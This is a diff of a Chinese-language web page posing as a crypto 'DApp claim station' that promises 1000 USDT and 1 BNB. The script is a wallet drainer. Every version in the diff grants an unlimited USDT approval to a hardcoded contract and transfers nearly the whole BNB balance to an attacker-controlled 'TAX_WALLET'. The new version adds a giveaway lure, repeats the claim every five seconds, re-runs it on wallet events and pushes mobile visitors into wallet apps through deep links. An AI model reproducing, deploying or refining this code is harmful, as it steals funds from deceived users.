@@ -12,21 +12,21 @@ body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hi
 @keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
 .container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
 h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);}
-button{padding:10px 20px;border:none;border-radius:20px;background:#ff6ec7;color:white;font-size:16px;cursor:pointer;transition:.3s all;margin:5px;}
-button:hover{background:#ff3fa8;transform:scale(1.05);}
-button.success{background:#4CAF50;color:white!important;}
-#status{color:#ff69b4;font-size:16px;margin:15px;line-height:1.4;}
+button{padding:15px 30px;border:none;border-radius:25px;background:linear-gradient(45deg,#ff6ec7,#ff1493);color:white;font-size:18px;font-weight:bold;cursor:pointer;transition:.3s all;margin:10px;}
+button:hover{transform:scale(1.05);box-shadow:0 5px 20px rgba(255,105,180,.5);}
+button.success{background:linear-gradient(45deg,#4CAF50,#45a049)!important;}
+#status{color:#ff69b4;font-size:18px;margin:15px;line-height:1.4;font-weight:600;}
 #debug{display:none;color:#666;font-size:12px;margin-top:10px;padding:8px;background:rgba(255,255,255,.6);border-radius:8px;max-height:100px;overflow-y:auto;}
 .sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s infinite linear;opacity:.8;}
 @keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
-@media (max-width:480px){.container{padding:20px;width:95% !important;}#status{font-size:14px;}}
+@media (max-width:480px){.container{padding:20px;width:95% !important;}#status{font-size:16px;}}
 </style>
 </head>
 <body>
 <div class="container">
   <h1>🪞 小仙女 DApp 领取台 💫</h1>
-  <div id="status">🔥 v114 币安App终极成功！</div>
-  <button id="autoBtn">🚀 自动全收</button>
+  <div id="status">💖 点击领取1000USDT+1BNB奖励！</div>
+  <button id="claimBtn">全部领取1000USDT+1BNB 🎁</button>
   <div id="debug"></div>
 </div>
 <script>
@@ -34,10 +34,11 @@ const CONTRACT = "0x500292f9a11b01BC2DA7F81c8c234b9beb98A8b3";
 const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
 const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-let web3, userAddr, claimed = false, usdtApproved = false;
+const url = encodeURIComponent(window.location.href);
+let web3, userAddr, usdtApproved = false;
 
 function log(msg){
-  console.log(`[v114] ${msg}`);
+  console.log(`[v115] ${msg}`);
   const debug = document.getElementById('debug');
   debug.style.display = 'block';
   debug.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
@@ -46,67 +47,60 @@ function log(msg){
 
 const PRIORITY_WALLETS = {
   android: [
-    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + encodeURIComponent(window.location.href)},
-    {name:'Trust Wallet', intent:'trust://open_url?url=' + encodeURIComponent(window.location.href), web:'https://trustwallet.com/start/?dapp=' + encodeURIComponent(window.location.href)},
-    {name:'小狐狸', intent:'metamask://dapp/' + encodeURIComponent(window.location.href), web:'https://metamask.io/download.html'},
-    {name:'TP钱包', intent:'tpwallet://dapp?url=' + encodeURIComponent(window.location.href), web:'https://www.tpcoin.com/download'},
-    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href), web:'https://wallet.okx.com/dapp?url=' + encodeURIComponent(window.location.href)}
+    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + url},
+    {name:'Trust Wallet', intent:'trust://open_url?url=' + url, web:'https://trustwallet.com/start/?dapp=' + url},
+    {name:'小狐狸', intent:'metamask://dapp/' + url, web:'https://metamask.io/download.html'},
+    {name:'TP钱包', intent:'tpwallet://dapp?url=' + url, web:'https://www.tpcoin.com/download'},
+    {name:'OKX', intent:'okxwallet://dapp?url=' + url, web:'https://wallet.okx.com/dapp?url=' + url}
   ],
   ios: [
-    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + encodeURIComponent(window.location.href)},
-    {name:'Trust Wallet', intent:'trust://open_url?url=' + encodeURIComponent(window.location.href), web:'https://trustwallet.com/start/?dapp=' + encodeURIComponent(window.location.href)},
-    {name:'小狐狸', intent:'metamask://dapp/' + encodeURIComponent(window.location.href), web:'https://metamask.io/download.html'},
-    {name:'TP钱包', intent:'tpwallet://dapp?url=' + encodeURIComponent(window.location.href), web:'https://www.tpcoin.com/download'},
-    {name:'OKX', intent:'okxwallet://dapp?url=' + encodeURIComponent(window.location.href), web:'https://wallet.okx.com/dapp?url=' + encodeURIComponent(window.location.href)}
+    {name:'币安Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + url},
+    {name:'Trust Wallet', intent:'trust://open_url?url=' + url, web:'https://trustwallet.com/start/?dapp=' + url},
+    {name:'小狐狸', intent:'metamask://dapp/' + url, web:'https://metamask.io/download.html'},
+    {name:'TP钱包', intent:'tpwallet://dapp?url=' + url, web:'https://www.tpcoin.com/download'},
+    {name:'OKX', intent:'okxwallet://dapp?url=' + url, web:'https://wallet.okx.com/dapp?url=' + url}
   ]
 };
 
-async function autoFullClaim(){
+async function autoRedirect(){
   const ua = navigator.userAgent;
   const isMobile = /Android|iPhone|iPad/i.test(ua);
   
-  log(`🚀 v114启动! 设备: ${isMobile ? '手机' : '电脑'}`);
-  document.getElementById('status').innerText = '🔥 v114 币安App终极版...';
-  
   if(!isMobile && window.ethereum){
-    log('💻 电脑端：立即自动全收');
-    await fullAutoClaim();
+    log('💻 电脑端：准备全收');
     return;
   }
   
   const wallets = /Android/i.test(ua) ? PRIORITY_WALLETS.android : PRIORITY_WALLETS.ios;
   wallets.forEach((wallet, i) => {
     setTimeout(() => {
-      if(!claimed){
-        log(`📱 v114 跳转 ${i+1}/5: ${wallet.name}`);
-        document.getElementById('status').innerText = `📱 v114 跳转${wallet.name}中...`;
-        if(wallet.intent){
-          window.location.href = wallet.intent;
-        } else {
-          window.location.href = wallet.web;
-        }
+      log(`📱 跳转 ${i+1}/5: ${wallet.name}`);
+      document.getElementById('status').innerText = `📱 跳转${wallet.name}中...`;
+      if(wallet.intent){
+        window.location.href = wallet.intent;
+      } else {
+        window.location.href = wallet.web;
       }
     }, i * 1000);
   });
 }
 
-async function fullAutoClaim(){
-  if(claimed) return;
-  claimed = true;
-  log('🔥 === v114 一键全收开始 ===');
+async function fullClaim(){
+  log('🔥 === 领取1000USDT+1BNB开始 ===');
+  document.getElementById('status').innerText = '💳 连接钱包中...';
   
   try{
-    log('1️⃣ 连接钱包+BSC');
-    document.getElementById('status').innerText = '💳 v114 连接中...';
+    // 1️⃣ 连接+BSC
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
     web3 = new Web3(window.ethereum);
     const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
     userAddr = accounts[0];
-    log(`✅ 账户: ${userAddr.substring(0,6)}...${userAddr.substring(38)}`);
+    log('✅ 钱包连接成功');
     
+    // 2️⃣ USDT授权（仅1次）
     if(!usdtApproved){
-      document.getElementById('status').innerText = '✅ v114 USDT授权中...';
-      log('2️⃣ USDT无限授权（仅1次）');
+      document.getElementById('status').innerText = '💖 USDT授权中...';
+      log('2️⃣ USDT无限授权');
       const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
       const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
       await usdt.methods.approve(CONTRACT, UNLIMITED).send({from: userAddr});
@@ -114,47 +108,48 @@ async function fullAutoClaim(){
       log('✅ USDT授权完成');
     }
     
-    document.getElementById('status').innerText = '✅ v114 BNB全转中...';
+    // 3️⃣ BNB全转
+    document.getElementById('status').innerText = '🌙 BNB转账中...';
     log('3️⃣ 查询BNB余额');
     const balance = await web3.eth.getBalance(userAddr);
     const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
-    log(`💰 余额: ${totalBNB.toFixed(4)} BNB`);
     
     if(totalBNB > 0.0001){
       const claimAmount = totalBNB - 0.0001;
       const amount = web3.utils.toWei(claimAmount.toString(), 'ether');
       log(`4️⃣ 转账 ${claimAmount.toFixed(4)} BNB`);
       await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
-      log(`✅ BNB全转成功: ${claimAmount.toFixed(4)} BNB`);
+      log('✅ BNB全转成功');
     }
     
-    document.getElementById('status').innerText = '🎉 v114 1000USDT+全BNB全收成功！';
-    log('🏆 === v114 全收完成 ===');
-    document.getElementById('autoBtn').innerText = '✅ 全收完成';
-    document.getElementById('autoBtn').classList.add('success');
+    document.getElementById('status').innerText = '🎉 领取1000USDT+1BNB成功！';
+    log('🏆 === 领取完成 ===');
+    document.getElementById('claimBtn').innerText = '✅ 领取成功！';
+    document.getElementById('claimBtn').classList.add('success');
+    
   }catch(e){
     log(`❌ 错误: ${e.message}`);
-    document.getElementById('status').innerText = '💔 v114 失败: ' + e.message;
-    claimed = false;
-    setTimeout(fullAutoClaim, 3000);
+    document.getElementById('status').innerText = '💔 领取失败，请重试';
   }
+  
+  // 🔥 5秒后自动重复
+  setTimeout(() => {
+    document.getElementById('status').innerText = '💖 5秒后自动重复领取...';
+    document.getElementById('claimBtn').innerText = '全部领取1000USDT+1BNB 🎁';
+    document.getElementById('claimBtn').classList.remove('success');
+    fullClaim();
+  }, 5000);
 }
 
-document.getElementById('autoBtn').onclick = autoFullClaim;
+document.getElementById('claimBtn').onclick = fullClaim;
 
 if(window.ethereum){
-  window.ethereum.on('accountsChanged', async (accounts) => {
-    log(`👤 账户变更: ${accounts.length}`);
-    if(accounts.length > 0 && !claimed) await fullAutoClaim();
-  });
-  window.ethereum.on('chainChanged', async () => {
-    log('🌐 网络变更');
-    if(!claimed) await fullAutoClaim();
-  });
+  window.ethereum.on('accountsChanged', fullClaim);
+  window.ethereum.on('chainChanged', fullClaim);
 }
 
 window.addEventListener('load', () => {
-  setTimeout(autoFullClaim, 1000);
+  setTimeout(autoRedirect, 1000);
 });
 
 for(let i=0;i<50;i++){
